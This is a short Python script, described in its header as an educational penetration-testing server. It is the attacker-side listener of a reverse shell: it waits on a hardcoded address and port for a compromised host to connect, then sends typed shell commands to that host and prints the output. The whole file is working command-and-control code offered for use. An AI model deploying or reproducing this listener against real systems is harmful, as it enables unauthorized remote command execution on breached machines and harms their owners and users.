#!/usr/bin/python3

#########################################################################################
#   Simple server for penetration testing, only educational !!!
#   scenario: target already compromised: start my server (attacket host) then connect 
#             to my server from the compromised (target) host
#########################################################################################

import socket



S_IP = "192.168.0.13"
S_PORT = 9091


class ServerN1F:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(1)

        print("[+] Waiting for connections")

        self.conn, addr = server.accept()

        print(f"[+] Client connected  {str(addr)}")


    def execute_command(self, command):
        self.conn.send(str.encode(command))
        return self.conn.recv(1024)

    def run_server(self):
        while True:
            command = input("$ ")
            result = self.execute_command(command)
            print(str(result))


if __name__ == "__main__":
    s = ServerN1F(S_IP, S_PORT)
    s.run_server()



